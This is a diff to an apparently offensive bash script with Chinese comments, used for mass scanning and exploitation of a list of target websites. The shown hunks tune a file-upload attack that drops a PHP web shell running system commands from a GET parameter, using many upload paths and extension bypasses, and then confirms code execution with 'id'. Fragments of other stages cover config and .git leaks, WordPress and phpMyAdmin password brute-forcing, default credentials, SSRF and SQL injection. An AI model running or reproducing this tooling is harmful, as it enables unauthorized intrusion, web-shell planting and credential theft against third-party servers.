@@ -29,29 +29,25 @@ echo "字典: master_passwords.txt + top100.txt + default_creds.txt"
 echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
 
 # ==========================================
-# 1. 文件上传（最高优先级，50路径×15绕过）
+# 1. 文件上传（最高优先级，优化：20路径×8扩展名）
 # ==========================================
 echo ""
-echo "[1/8] 🚀 文件上传（50路径×15绕过，并发15，五重验证）..."
-cat $OUT/targets.txt | xargs -P 15 -I {} bash -c '
+echo "[1/8] 🚀 文件上传（20路径×8扩展名，并发20，五重验证）..."
+CNT=0
+cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
     url="{}"
     flag="$(echo {} | md5sum | cut -c1-8)"
     
     for path in /upload /upload.php /fileupload /api/upload /api/file/upload /api/File/UploadFile \
                 /uploadFile /upload.aspx /admin/upload /user/upload /file/upload /attachment/upload \
                 /api/v1/upload /api/v2/upload /media/upload /image/upload /files/upload \
-                /document/upload /photo/upload /avatar/upload /content/upload /assets/upload \
-                /static/upload /public/upload /uploads /uploader /filemanager /manager/upload \
-                /editor/upload /ckeditor/upload /ckfinder/upload /elfinder/upload /tinymce/upload \
-                /summernote/upload /uploadify /swfupload /plupload /fineuploader /dropzone \
-                /jquery-file-upload /blueimp /uploadimage /uploadpic /imgupload /picupload \
-                /photoupload /fileUpload /File/Upload /Upload/File /api/attachment /api/uploadFile; do
+                /uploader /filemanager /api/uploadFile; do
         
-        for ext in php PhP pHp phP pHP Php PHP5 phtml php3 php4 php5 php7 phar; do
+        for ext in php PhP pHP phtml php5 php7 phar php3; do
             echo "<?php echo \"U${flag}\";@system(\$_GET[0]); ?>" > /tmp/u_$$_${ext}
             
-            # 上传
-            resp=$(curl -skL -m 8 "$url$path" -F "file=@/tmp/u_$$_${ext}" -F "upload=@/tmp/u_$$_${ext}" \
+            # 上传（超时5秒）
+            resp=$(curl -skL -m 5 "$url$path" -F "file=@/tmp/u_$$_${ext}" -F "upload=@/tmp/u_$$_${ext}" \
                 -H "User-Agent: Mozilla/5.0" 2>/dev/null)
             
             # 提取shell URL（严格匹配）
@@ -60,13 +56,13 @@ cat $OUT/targets.txt | xargs -P 15 -I {} bash -c '
             # 验证1: URL格式正确
             if [ -n "$shell" ] && echo "$shell" | grep -qE "^https?://" && echo "$shell" | grep -q "\.${ext}$"; then
                 # 验证2: 访问shell，检查flag
-                v1=$(curl -skL -m 5 "$shell" 2>/dev/null)
+                v1=$(curl -skL -m 4 "$shell" 2>/dev/null)
                 if echo "$v1" | grep -q "U${flag}"; then
                     # 验证3: 命令执行测试
-                    v2=$(curl -skL -m 5 "$shell?0=echo+test123" 2>/dev/null)
+                    v2=$(curl -skL -m 4 "$shell?0=echo+test123" 2>/dev/null)
                     if echo "$v2" | grep -q "test123"; then
                         # 验证4: 系统命令测试
-                        v3=$(curl -skL -m 5 "$shell?0=id" 2>/dev/null)
+                        v3=$(curl -skL -m 4 "$shell?0=id" 2>/dev/null)
                         if echo "$v3" | grep -qE "uid=|gid="; then
                             # 验证5: 确保不是错误页面
                             if ! echo "$v3" | grep -qiE "error|404|not found|forbidden"; then
@@ -81,8 +77,7 @@ cat $OUT/targets.txt | xargs -P 15 -I {} bash -c '
             rm -f /tmp/u_$$_${ext}
         done
     done
-' &
-wait
+'
 UPLOAD=$(wc -l < $OUT/shells/01_upload.txt 2>/dev/null || echo 0)
 echo "  ✅ Upload Shell: $UPLOAD"
 
@@ -132,8 +127,7 @@ cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
             echo "$url/.git/config" >> '"$OUT"'/shells/02_git.txt
         fi
     fi
-' &
-wait
+'
 ENV=$(wc -l < $OUT/shells/02_env.txt 2>/dev/null || echo 0)
 CONFIG=$(wc -l < $OUT/shells/02_config.txt 2>/dev/null || echo 0)
 WPCONFIG=$(wc -l < $OUT/shells/02_wpconfig.txt 2>/dev/null || echo 0)
@@ -166,8 +160,7 @@ cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
             fi
         fi
     done
-' &
-wait
+'
 API=$(wc -l < $OUT/shells/03_api.txt 2>/dev/null || echo 0)
 echo "  ✅ 未授权API: $API"
 
@@ -190,8 +183,7 @@ cat $OUT/targets.txt | xargs -P 30 -I {} bash -c '
             fi
         fi
     fi
-' &
-wait
+'
 GIT_LEAK=$(wc -l < $OUT/shells/04_git.txt 2>/dev/null || echo 0)
 echo "  ✅ Git泄露: $GIT_LEAK"
 
@@ -213,8 +205,7 @@ cat $OUT/targets.txt | xargs -P 30 -I {} bash -c '
             fi
         fi
     fi
-' &
-wait
+'
 WP=$(wc -l < $OUT/shells/05_wordpress.txt 2>/dev/null || echo 0)
 echo "  ✅ WordPress: $WP"
 
@@ -236,8 +227,7 @@ cat $OUT/targets.txt | xargs -P 30 -I {} bash -c '
             break
         fi
     done
-' &
-wait
+'
 PMA=$(wc -l < $OUT/shells/06_phpmyadmin.txt 2>/dev/null || echo 0)
 echo "  ✅ phpMyAdmin: $PMA"
 
@@ -265,8 +255,7 @@ cat $OUT/targets.txt | xargs -P 15 -I {} bash -c '
             break
         fi
     done
-' &
-wait
+'
 SSRF=$(wc -l < $OUT/shells/07_ssrf.txt 2>/dev/null || echo 0)
 echo "  ✅ SSRF: $SSRF"
 
@@ -300,8 +289,7 @@ cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
             fi
         done
     done
-' &
-wait
+'
 BACKUP=$(wc -l < $OUT/shells/08_backup.txt 2>/dev/null || echo 0)
 echo "  ✅ 备份文件: $BACKUP"
 
@@ -395,8 +383,7 @@ echo "[10/14] 🔓 WordPress弱口令（增强字典，并发10）..."
             exit 0
         fi
     done < '"$TOP100"'
-' &
-wait
+'
 WP_CREDS=$(wc -l < $OUT/shells/10_wp_creds.txt 2>/dev/null || echo 0)
 echo "  ✅ WordPress凭证: $WP_CREDS"
 
@@ -458,8 +445,7 @@ echo "[11/14] 🔓 phpMyAdmin弱口令（增强字典，并发10）..."
             exit 0
         fi
     done < '"$TOP100"'
-' &
-wait
+'
 PMA_CREDS=$(wc -l < $OUT/shells/11_pma_creds.txt 2>/dev/null || echo 0)
 echo "  ✅ phpMyAdmin凭证: $PMA_CREDS"
 
@@ -487,8 +473,7 @@ cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
             fi
         done
     done
-' &
-wait
+'
 DEFAULT_CREDS_COUNT=$(wc -l < $OUT/shells/12_default_creds.txt 2>/dev/null || echo 0)
 echo "  ✅ 默认凭证: $DEFAULT_CREDS_COUNT"
 
@@ -554,8 +539,7 @@ cat $OUT/targets.txt | xargs -P 15 -I {} bash -c '
             fi
         done
     fi
-' &
-wait
+'
 SQLI_TIME=$(wc -l < $OUT/shells/13_sqli_time.txt 2>/dev/null || echo 0)
 SQLI_ERROR=$(wc -l < $OUT/shells/13_sqli_error.txt 2>/dev/null || echo 0)
 SQLI_UNION=$(wc -l < $OUT/shells/13_sqli_union.txt 2>/dev/null || echo 0)
